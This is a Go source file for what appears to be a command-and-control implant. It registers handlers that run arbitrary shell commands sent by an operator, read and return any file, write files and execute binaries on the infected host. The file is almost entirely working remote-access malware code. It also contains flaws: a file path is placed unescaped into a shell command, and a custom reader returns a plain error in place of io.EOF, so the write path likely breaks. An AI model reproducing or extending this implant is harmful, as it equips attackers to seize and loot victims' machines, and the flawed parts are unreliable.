package c2implant

import (
	"fmt"
	"os/exec"
	"time"

	"github.com/angel-platform/angel/pkg/types"
)

type TaskHandler func(task *types.Task) (*types.TaskResult, error)

type TaskDispatcher struct {
	handlers map[types.TaskType]TaskHandler
}

func NewTaskDispatcher() *TaskDispatcher {
	td := &TaskDispatcher{
		handlers: make(map[types.TaskType]TaskHandler),
	}

	td.RegisterHandler(types.TaskTypeShell, ShellTaskHandler)
	td.RegisterHandler(types.TaskTypeDownload, DownloadTaskHandler)
	td.RegisterHandler(types.TaskTypeUpload, UploadTaskHandler)
	td.RegisterHandler(types.TaskTypeExecute, ExecuteTaskHandler)

	return td
}

func (td *TaskDispatcher) RegisterHandler(taskType types.TaskType, handler TaskHandler) {
	td.handlers[taskType] = handler
}

func (td *TaskDispatcher) Dispatch(task *types.Task) (*types.TaskResult, error) {
	if task == nil {
		return nil, fmt.Errorf("nil task")
	}

	handler, ok := td.handlers[task.Type]
	if !ok {
		return &types.TaskResult{
			Module:    string(task.Type),
			Success:   false,
			Error:     fmt.Sprintf("no handler for task type: %s", task.Type),
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	return handler(task)
}

func (td *TaskDispatcher) HasHandler(taskType types.TaskType) bool {
	_, ok := td.handlers[taskType]
	return ok
}

func (td *TaskDispatcher) GetHandler(taskType types.TaskType) (TaskHandler, bool) {
	h, ok := td.handlers[taskType]
	return h, ok
}

func ShellTaskHandler(task *types.Task) (*types.TaskResult, error) {
	if len(task.Payload) == 0 {
		return &types.TaskResult{
			Module:    "shell",
			Success:   false,
			Error:     "empty payload",
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	cmd := exec.Command("sh", "-c", string(task.Payload))
	output, err := cmd.CombinedOutput()

	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
		}
	}

	result := &types.ShellResult{
		Stdout:   string(output),
		ExitCode: exitCode,
		Duration: time.Since(task.CreatedAt),
	}

	data := map[string]interface{}{
		"stdout":    result.Stdout,
		"exit_code": result.ExitCode,
		"duration":  result.Duration.Milliseconds(),
	}

	return &types.TaskResult{
		Module:    "shell",
		Success:   exitCode == 0,
		Data:      data,
		Error:     "",
		Timestamp: time.Now(),
	}, nil
}

func DownloadTaskHandler(task *types.Task) (*types.TaskResult, error) {
	if len(task.Payload) == 0 {
		return &types.TaskResult{
			Module:    "download",
			Success:   false,
			Error:     "empty payload (expected file path)",
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	filePath := string(task.Payload)

	content, err := readFileContent(filePath)
	if err != nil {
		return &types.TaskResult{
			Module:    "download",
			Success:   false,
			Error:     fmt.Sprintf("read file: %v", err),
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	data := map[string]interface{}{
		"file_path": filePath,
		"content":   content,
		"size":      len(content),
	}

	return &types.TaskResult{
		Module:    "download",
		Success:   true,
		Data:      data,
		Timestamp: time.Now(),
	}, nil
}

func UploadTaskHandler(task *types.Task) (*types.TaskResult, error) {
	if len(task.Payload) == 0 {
		return &types.TaskResult{
			Module:    "upload",
			Success:   false,
			Error:     "empty payload",
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	payload := string(task.Payload)

	filePath, content, err := parseUploadPayload(payload)
	if err != nil {
		return &types.TaskResult{
			Module:    "upload",
			Success:   false,
			Error:     fmt.Sprintf("parse payload: %v", err),
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	if err := writeFileContent(filePath, []byte(content)); err != nil {
		return &types.TaskResult{
			Module:    "upload",
			Success:   false,
			Error:     fmt.Sprintf("write file: %v", err),
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	data := map[string]interface{}{
		"file_path": filePath,
		"size":      len(content),
	}

	return &types.TaskResult{
		Module:    "upload",
		Success:   true,
		Data:      data,
		Timestamp: time.Now(),
	}, nil
}

func ExecuteTaskHandler(task *types.Task) (*types.TaskResult, error) {
	if len(task.Payload) == 0 {
		return &types.TaskResult{
			Module:    "execute",
			Success:   false,
			Error:     "empty payload (expected executable path)",
			Data:      make(map[string]interface{}),
			Timestamp: time.Now(),
		}, nil
	}

	execPath := string(task.Payload)

	cmd := exec.Command(execPath)
	output, err := cmd.CombinedOutput()

	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
		}
	}

	data := map[string]interface{}{
		"exec_path": execPath,
		"output":    string(output),
		"exit_code": exitCode,
	}

	return &types.TaskResult{
		Module:    "execute",
		Success:   exitCode == 0,
		Data:      data,
		Error:     "",
		Timestamp: time.Now(),
	}, nil
}

func readFileContent(path string) ([]byte, error) {
	cmd := exec.Command("cat", path)
	return cmd.Output()
}

func writeFileContent(path string, data []byte) error {
	cmd := exec.Command("sh", "-c", fmt.Sprintf("cat > %s", path))
	cmd.Stdin = stringToReader(data)
	return cmd.Run()
}

func parseUploadPayload(payload string) (filePath string, content string, err error) {
	for i, ch := range payload {
		if ch == '\n' {
			return payload[:i], payload[i+1:], nil
		}
	}
	return "", "", fmt.Errorf("invalid upload payload format")
}

func stringToReader(s []byte) *stringReader {
	return &stringReader{data: s, pos: 0}
}

type stringReader struct {
	data []byte
	pos  int
}

func (r *stringReader) Read(p []byte) (n int, err error) {
	if r.pos >= len(r.data) {
		return 0, fmt.Errorf("EOF")
	}
	n = copy(p, r.data[r.pos:])
	r.pos += n
	return n, nil
}
